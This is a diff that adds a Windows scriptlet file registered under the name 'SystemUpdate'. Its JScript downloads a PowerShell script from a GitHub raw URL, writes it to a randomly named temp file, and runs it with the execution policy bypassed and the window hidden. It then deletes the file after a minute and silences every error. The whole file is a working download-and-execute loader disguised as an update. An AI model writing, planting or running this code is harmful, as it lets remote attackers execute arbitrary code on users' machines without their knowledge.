@@ -1,0 +1,43 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration progid="SystemUpdate" classid="{10001111-0000-0000-0000-0000FEEDACDC}"></registration>
+<public>
+</public>
+<script language="JScript">
+<![CDATA[
+    try {
+        var x = new ActiveXObject("Msxml2.XMLHTTP");
+        x.open("GET", "https://raw.githubusercontent.com/rootkalilocalhost/modules/main/v3.ps1", false);
+        x.send();
+        
+        if (x.status == 200) {
+            var content = x.responseText;
+            // Safe saving to temporary file
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            var tempFile = fso.GetSpecialFolder(2) + "\\~tmp" + Math.round(Math.random() * 10000) + ".ps1";
+            var ts = fso.CreateTextFile(tempFile, true);
+            ts.Write(content);
+            ts.Close();
+            
+            var s = new ActiveXObject("WScript.Shell");
+            var cmd = 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + tempFile + '"';
+            s.Run(cmd, 0, false); // Do not wait for completion
+            
+            // Cleanup after 60 seconds (1 minute)
+            setTimeout(function() {
+                try { 
+                    // Check if file exists before deletion
+                    if (fso.FileExists(tempFile)) {
+                        fso.DeleteFile(tempFile, true);
+                    }
+                } catch(e) {
+                    // Silent error handling for deletion
+                }
+            }, 60000); // 60000 ms = 60 seconds
+        }
+    } catch(e) {
+        // Silent error handling
+    }
+]]>
+</script>
+</scriptlet>
